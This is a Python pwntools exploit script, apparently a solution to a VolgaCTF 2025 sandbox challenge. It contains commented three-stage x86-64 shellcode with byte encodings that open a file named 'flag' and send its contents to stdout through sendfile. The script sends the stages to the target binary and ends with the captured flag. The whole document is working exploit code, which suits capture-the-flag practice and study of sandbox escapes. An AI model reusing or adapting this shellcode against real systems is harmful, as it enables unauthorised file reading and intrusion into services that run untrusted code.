#!/usr/bin/env python3

from pwn import *

elf = ELF( "app", False )
# libc = ELF( "libc.so.6", False )

# s = remote( "pwn-sbsbx-1.q.2025.volgactf.ru", 33072 )
# s = remote( "localhost", 33072 )
s = process( elf.path )


"""
--- Stage 1: Put 'flag' on the stack --- 

    mov DWORD [rsp+0x8], 0x67616c66     | c7 44 24 08 'f 'l 'a 'g
#   mov QWORD [r13],     0x67616c66     | 49 c7 45 00 'f 'l 'a 'g
    ret                                 | c3

--- Stage 2: open('flag') ---

    lea rdi, [rsp+0x8]      | 48 8d 7c 24 08
#   push   r13              | 41 55
#   pop    rdi              | 5f

    mov al, 2               | b0 02
    syscall                 | 0f 05
    ret                     | c3

--- Stage 3: sendfile(1, fd, 0, ?) ---

    xchg esi, edi           | 87 fe
    inc edi                 | ff c7

    mov al, 40              | b0 28
    syscall                 | 0f 05

"""


def main():

    shellcodes = [  
        open("stage1-sendfile", "rb").read(),
        open("stage2-sendfile", "rb").read(),
        open("stage3-sendfile", "rb").read(),
    ]

    assert len(shellcodes[0]) <= 9,  print(f"Shellcode-1: { len(shellcodes[0]) } bytes")
    assert len(shellcodes[1]) <= 10, print(f"Shellcode-2: { len(shellcodes[1]) } bytes")
    assert len(shellcodes[2]) <= 9,  print(f"Shellcode-3: { len(shellcodes[2]) } bytes")

    s.sendafter(b'First:\n',  shellcodes[0])
    s.sendafter(b'Second:\n', shellcodes[1])
    s.sendafter(b'Third:\n',  shellcodes[2])
    
    s.interactive()


if __name__ == "__main__":
    main()

# VolgaCTF{w4rm1e_upp1e}
